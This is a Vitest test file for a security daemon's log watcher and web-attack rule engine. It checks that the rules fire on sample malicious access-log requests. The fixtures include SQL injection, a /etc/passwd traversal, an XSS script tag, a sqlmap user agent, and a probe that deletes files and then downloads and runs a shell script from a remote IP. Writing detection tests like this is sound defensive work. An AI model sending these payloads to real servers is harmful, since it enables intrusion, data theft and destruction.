import { afterEach, describe, it, expect, vi } from 'vitest';
import type { EventBus } from '../event-bus.js';
import type { ThreatEvent } from '../../types/events.js';
import { configureAttackDetection } from '../../core/log-parser.js';
import { crsAttackType } from '../../core/crs/engine.js';
import { CRS_RULES } from '../../core/crs/rules.generated.js';
import { DEFAULT_RULES } from '../rules/default-rules.js';
import { RuleEngine } from '../rules/engine.js';

vi.mock('../../core/state.js', () => ({ insertEvent: () => {} }));

const { LogWatcher } = await import('../watchers/log-watcher.js');

const SOURCE = { path: '/var/log/nginx/access.log', module: 'log-watcher', category: 'web' as const };

const SQLMAP_UA = 'sqlmap/1.7.2#stable (https://sqlmap.org)';

const WEB_ATTACK_RULES = [
  'web-sqli-attack',
  'web-path-traversal',
  'web-xss-attack',
  'web-scanner-user-agent',
  'exploit-probe-pattern',
];

/** The event the daemon's log-watcher publishes for one access-log line. */
function daemonEvent(request: string, status = 200, ua = 'Mozilla/5.0'): ThreatEvent | undefined {
  let published: ThreatEvent | undefined;
  const bus = { publish: (e: ThreatEvent) => { published = e; } } as unknown as EventBus;
  // `process` is the watcher's per-line parser; tailing a real file adds only a
  // one-second poll around it.
  const watcher = new LogWatcher(bus, []) as unknown as { process(line: string, src: typeof SOURCE): void };
  watcher.process(
    `203.0.113.9 - - [25/Sep/2026:09:19:29 +0000] "${request}" ${status} 614 "-" "${ua}"`,
    SOURCE,
  );
  return published;
}

function firedRules(event: ThreatEvent): string[] {
  const fired: string[] = [];
  const engine = new RuleEngine((d) => fired.push(d.rule_id));
  engine.loadRules(DEFAULT_RULES);
  engine.evaluate(event);
  return fired;
}

describe('web-attack rules on daemon log-watcher events', () => {
  afterEach(() => configureAttackDetection(undefined));

  it.each([
    ['web-sqli-attack', 'GET /search?q=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1', undefined],
    ['web-path-traversal', 'GET /download?file=../../../../etc/passwd HTTP/1.1', undefined],
    ['web-xss-attack', 'GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1', undefined],
    ['web-scanner-user-agent', 'GET / HTTP/1.1', SQLMAP_UA],
    ['exploit-probe-pattern', 'GET /shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.7/x.sh;sh+x.sh HTTP/1.1', undefined],
  ])('%s fires on %s', (ruleId, request, ua) => {
    const event = daemonEvent(request, 200, ua);
    expect(event?.severity).toMatch(/^(high|critical)$/);
    expect(firedRules(event!)).toContain(ruleId);
  });

  it.each([
    ['path_traversal', 200, 'GET /.env HTTP/1.1', undefined],
    ['path_traversal', 404, 'GET /.env HTTP/1.1', undefined],
    ['scanner', 200, 'GET / HTTP/1.1', SQLMAP_UA],
    ['scanner', 404, 'GET / HTTP/1.1', SQLMAP_UA],
  ])('does not fire below the CRS anomaly threshold (%s, a %i)', (type, status, request, ua) => {
    // One CRITICAL CRS rule scores 5; at a threshold of 10 it is a `low`
    // event that still carries its attack_type.
    configureAttackDetection({ anomaly_threshold: 10 });
    const event = daemonEvent(request, status, ua)!;
    expect(event.severity).toBe('low');
    expect(event.details?.attack_type).toBe(type);
    expect(firedRules(event).filter((id) => WEB_ATTACK_RULES.includes(id))).toEqual([]);
  });

  // Default-off rules included: `include_rules` can switch them back on.
  const emittable = [...new Set(CRS_RULES.map((rule) => crsAttackType(rule)))];

  it('credits every ban-level request to a type: no ported CRS rule is untyped', () => {
    expect(emittable).not.toContain(null);
  });

  it.each(emittable.flatMap((type) => [[type, 'high'], [type, 'critical']] as const))(
    'exactly one rule claims a %s attack at %s',
    (type, severity) => {
      const event: ThreatEvent = {
        timestamp: new Date(),
        module: 'log-watcher',
        category: 'web',
        severity,
        message: `Attack [${String(type).toUpperCase()}]: GET /`,
        source_ip: '203.0.113.9',
        details: { attack_type: type },
      };
      expect(firedRules(event)).toHaveLength(1);
    },
  );
});
